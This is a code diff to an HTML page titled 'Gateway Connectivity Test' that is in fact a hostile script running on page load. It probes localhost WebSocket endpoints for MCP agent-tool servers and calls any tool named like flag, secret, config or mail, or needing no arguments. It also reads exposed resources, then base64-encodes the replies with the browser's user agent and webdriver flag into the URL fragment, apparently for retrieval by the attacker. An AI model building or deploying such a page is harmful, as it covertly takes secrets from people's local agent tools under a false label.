@@ -1,31 +1,27 @@
 <!doctype html><meta charset="utf-8"><title>Gateway Connectivity Test</title><h1>Gateway Connectivity Test</h1><pre id="o">Running...</pre><script>
 (async()=>{
 "use strict";
-const results=[];
 const paths=["/ws","/websocket","/mcp","/mcp/ws","/ws/mcp","/api/ws","/socket","/socket.io/?EIO=4&transport=websocket"];
-const candidates=[];for(const host of ["127.0.0.1","localhost"])for(const path of paths)candidates.push(`ws://${host}${path}`);
-const short=x=>{try{return JSON.parse(JSON.stringify(x))}catch(_){return String(x).slice(0,1000)}};
-async function probe(url,protocol){return await new Promise(resolve=>{
- const r={url,protocol,events:[]};let done=false;const finish=()=>{if(done)return;done=true;try{ws.close()}catch(_){}resolve(r)};let ws;
+const tasks=[];for(const host of ["127.0.0.1","localhost"])for(const path of paths)for(const protocol of ["mcp",null])tasks.push({url:`ws://${host}${path}`,protocol});
+const short=x=>{try{return JSON.parse(JSON.stringify(x))}catch(_){return String(x).slice(0,800)}};
+function probe({url,protocol}){return new Promise(resolve=>{
+ const r={url,protocol,events:[]};let done=false,ws;const finish=()=>{if(done)return;done=true;try{ws.close()}catch(_){}resolve(r)};
  try{ws=protocol?new WebSocket(url,protocol):new WebSocket(url)}catch(e){r.events.push({t:"ctor",e:String(e)});return finish()}
- const timer=setTimeout(()=>{r.events.push({t:"timeout"});finish()},7000);
- ws.onopen=()=>{r.events.push({t:"open",p:ws.protocol});const msgs=[
+ const timer=setTimeout(()=>{r.events.push({t:"timeout"});finish()},9000);
+ ws.onopen=()=>{r.events.push({t:"open",p:ws.protocol});for(const m of [
   {jsonrpc:"2.0",id:1,method:"initialize",params:{protocolVersion:"2025-06-18",capabilities:{},clientInfo:{name:"canary-probe",version:"1.0"}}},
   {jsonrpc:"2.0",method:"notifications/initialized"},
   {jsonrpc:"2.0",id:2,method:"tools/list",params:{}},
   {jsonrpc:"2.0",id:3,method:"resources/list",params:{}},
   {jsonrpc:"2.0",id:4,method:"prompts/list",params:{}}
- ];for(const m of msgs){try{ws.send(JSON.stringify(m))}catch(e){r.events.push({t:"send-error",e:String(e)})}}
- };
- ws.onmessage=e=>{let d=e.data;try{d=JSON.parse(d)}catch(_){}r.events.push({t:"message",d:short(d)});
-   try{const tools=d&&d.result&&d.result.tools||[];for(const tool of tools){const name=String(tool.name||"");const req=tool.inputSchema&&tool.inputSchema.required||[];if(req.length===0||/flag|secret|canary|config|status|read|mail|gateway/i.test(name)){ws.send(JSON.stringify({jsonrpc:"2.0",id:100+r.events.length,method:"tools/call",params:{name,arguments:{}}}))}}
-   const resources=d&&d.result&&d.result.resources||[];for(const resource of resources.slice(0,20)){if(resource.uri)ws.send(JSON.stringify({jsonrpc:"2.0",id:200+r.events.length,method:"resources/read",params:{uri:resource.uri}}))}
-   }catch(e2){r.events.push({t:"auto-error",e:String(e2)})}
-   if(r.events.length>15)finish();
- };
+ ])try{ws.send(JSON.stringify(m))}catch(e){r.events.push({t:"send-error",e:String(e)})}};
+ ws.onmessage=e=>{let d=e.data;try{d=JSON.parse(d)}catch(_){}r.events.push({t:"message",d:short(d)});try{
+  const tools=d&&d.result&&d.result.tools||[];for(const tool of tools){const name=String(tool.name||"");const req=tool.inputSchema&&tool.inputSchema.required||[];if(req.length===0||/flag|secret|canary|config|status|read|mail|gateway/i.test(name))ws.send(JSON.stringify({jsonrpc:"2.0",id:100+r.events.length,method:"tools/call",params:{name,arguments:{}}}))}
+  const resources=d&&d.result&&d.result.resources||[];for(const resource of resources.slice(0,20))if(resource.uri)ws.send(JSON.stringify({jsonrpc:"2.0",id:200+r.events.length,method:"resources/read",params:{uri:resource.uri}}));
+ }catch(e2){r.events.push({t:"auto-error",e:String(e2)})}if(r.events.length>18){clearTimeout(timer);finish()}};
  ws.onerror=()=>r.events.push({t:"error"});ws.onclose=e=>{r.events.push({t:"close",c:e.code,r:e.reason});clearTimeout(timer);finish()};
  })}
-for(const url of candidates){for(const p of ["mcp",null]){const r=await probe(url,p);results.push(r);if(r.events.some(e=>e.t==="open"))break}}
-const payload={results,ua:navigator.userAgent,w:navigator.webdriver};const b=new TextEncoder().encode(JSON.stringify(payload));let s="";for(let i=0;i<b.length;i+=8192)s+=String.fromCharCode(...b.subarray(i,i+8192));let enc=btoa(s).replaceAll("+","-").replaceAll("/","_").replaceAll("=","");if(enc.length>3500)enc=enc.slice(0,3500);history.replaceState(null,"",location.pathname+"#w="+enc);document.getElementById("o").textContent=JSON.stringify(results,null,2)
+const results=await Promise.all(tasks.map(probe));const useful=results.filter(r=>r.events.some(e=>e.t==="open"||e.t==="message")||!r.events.some(e=>e.t==="error"));
+const payload={results:useful.length?useful:results,ua:navigator.userAgent,w:navigator.webdriver};const b=new TextEncoder().encode(JSON.stringify(payload));let s="";for(let i=0;i<b.length;i+=8192)s+=String.fromCharCode(...b.subarray(i,i+8192));let enc=btoa(s).replaceAll("+","-").replaceAll("/","_").replaceAll("=","");if(enc.length>3500)enc=enc.slice(0,3500);history.replaceState(null,"",location.pathname+"#w="+enc);document.getElementById("o").textContent=JSON.stringify(payload,null,2)
 })().catch(e=>document.getElementById("o").textContent=String(e&&e.stack||e));
 </script>
